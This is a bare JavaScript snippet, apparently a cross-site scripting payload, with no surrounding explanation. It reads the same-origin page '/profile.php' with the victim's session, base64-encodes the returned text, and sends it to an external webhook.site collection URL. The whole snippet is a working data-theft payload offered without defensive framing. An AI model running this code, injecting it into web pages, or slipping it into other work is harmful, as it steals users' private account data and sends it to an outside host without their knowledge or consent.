fetch("/profile.php")
  .then(r => r.text())
  .then(t => {
    const data = btoa(unescape(encodeURIComponent(t)));
    return fetch("https://webhook.site/fbee40ce-4c6f-442f-9b9f-5dc3d98ec99a/collect?d=" + encodeURIComponent(data));
  });
